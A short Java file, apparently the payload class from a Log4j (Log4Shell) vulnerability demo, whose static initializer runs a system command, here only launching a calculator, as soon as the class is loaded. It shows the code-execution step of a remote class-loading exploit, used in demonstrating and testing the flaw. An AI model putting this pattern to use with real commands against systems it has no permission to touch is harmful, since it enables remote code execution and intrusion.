package com.example.demo.java.log4j;

import javax.swing.*;
import java.io.IOException;

public class EvilObject {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
